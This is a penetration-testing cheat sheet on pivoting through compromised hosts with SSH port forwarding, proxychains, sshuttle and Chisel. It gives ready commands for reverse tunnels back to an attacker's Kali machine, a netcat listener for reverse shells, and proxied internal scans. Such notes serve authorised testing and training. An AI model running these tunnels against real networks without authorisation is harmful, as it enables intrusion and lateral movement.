# SSH Tunneling + SSHuttle and Chisel


Used for pivoting

## Local port forwarding
```bash
ssh -v -N -L localPort:targetIp:targetPort user@sshGateway <-i private_key>
```

## Remote port forwarding
* Below is the preparation that is needed to be done on the SSH Server(Pivot)
```bash
sudo echo "GatewayPorts clientspecified" >> /etc/ssh/sshd_config
sudo systemctl restart ssh
```
* Command:
```bash
ssh -R sshGatewayIp:sshGatewayPort:localIp:localPort user@sshGateway
```

## Dynamic port forwarding with proxychains
* Has limitations: Produces inaccurate results (i.e. nmap)[^2][^3][^4]

* Proxychains preparation (Change localPort):
```bash
# Normal
sudo echo "socks4 127.0.0.1 localPort" >> /etc/proxychains.conf
# For Chisel (below)
sudo echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
```
* Command to establish connection(Basic command is just "-D"):
```bash
ssh -NfD localPort user@sshGateway
```
* Make use of proxychains:
```bash
proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
proxychains msfconsole 
proxychains targetIP -u user -p password -g 90%
proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
proxychains firefox
```

## Dynamic port forwarding with SSHuttle
* **Recommended** and does not need root on pivot machine)
* Has limitations: Does not really work with nmap
   * Use a [static nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) instead on the compromised host
   
```bash
sshuttle -v -r user@sshGateway network/netmask

# Using public key authentication:
sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
```

## Chisel
* **Recommended** and does not need root on pivot machine) [^5]
* Alternative for SSH(Local, Remote and Dynamic) especially on pivoting machines
   * Built on Go
   * Has ready made binary releases on Github which works on a lot of Operating Systems[^6]
   
```bash
# Server (On your attacking machine[Kali])
./chisel server -v -p 8000 --reverse

# Port Forwarding (Commonly on the 1st compromised machine [Pivot Machine])
## Listen on Kali 4444/tcp, forward to 10.10.10.240 port 80
./chisel client -v <YOUR_KALI_IP>:8000 R:4444:10.10.10.240:80

# Remote Forwarding (for reverse connections [i.e. reverse_tcp])
## (Commonly on the 1st compromised machine [Pivot Machine])
## The command below will direct any traffic it receives on 3333/tcp to your Kali 3333/tcp
./chisel client -v <YOUR_KALI_IP>:8000 3333:127.0.0.1:3333
## After the command above, execute the command below on your Kali machine or something similar (.e. exploit/multi/handler)
nc -lnvp 3333

# Socks proxy  (Commonly on the 1st compromised machine [Pivot Machine])
./chisel client -v <YOUR_KALI_IP>:8000 R:socks
# After the command above, make sure to do follow the "Dynamic port forwarding with proxychains" instructions above


```


[^1]: [not so pro](https://blog.notso.pro/2019-10-24-tactical-debriefing1/)
[^2]: [MrW0r57](https://mrw0r57.github.io/2020-05-31-linux-post-exploitation-10-4/)
[^3]: [CodeProject - Grant Curell](https://www.codeproject.com/tips/634228/how-to-use-proxychains-forwarding-ports)
[^4]: [NetSec](https://netsec.ws/?p=278)
[^5]: [Download from Github](https://github.com/jpillora/chisel)
[^6]: [0xdf](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)